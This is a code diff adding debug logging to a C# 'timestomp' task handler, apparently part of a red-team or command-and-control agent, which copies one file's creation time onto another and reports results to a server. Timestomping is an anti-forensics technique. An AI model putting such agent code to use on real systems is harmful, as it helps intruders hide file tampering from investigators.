@@ -16,18 +16,20 @@ namespace Workflow
         }
         public async Task Execute(ServerJob job)
         {
+            DebugLog.Log($"Executing {Name} [{job.task.id}]");
             string response = String.Empty;
             TimeStompArgs args = JsonSerializer.Deserialize<TimeStompArgs>(job.task.parameters);
             if(args is null){
+                DebugLog.Log($"{Name} args null [{job.task.id}]");
                 return;
             }
-            
+
             if(!args.Validate(out response))
             {
+                DebugLog.Log($"{Name} validation failed [{job.task.id}]");
                 messageManager.Write(response, job.task.id, true, "error");
             }
 
-            //StringBuilder sb = new StringBuilder();
             try
             {
                 DateTime ct = File.GetCreationTime(args.source);
@@ -47,11 +49,13 @@ namespace Workflow
             }
             catch (Exception e)
             {
+                DebugLog.Log($"{Name} error: {e.Message} [{job.task.id}]");
                 response = $"Failed to timestomp: {args.destination} {e.ToString()}";
                 //sb.AppendFormat("Could not timestomp {0}: {1}", args.destination, e.ToString()).AppendLine();
             }
 
             messageManager.Write(response, job.task.id, true);
+            DebugLog.Log($"{Name} completed [{job.task.id}]");
         }
     }
 }
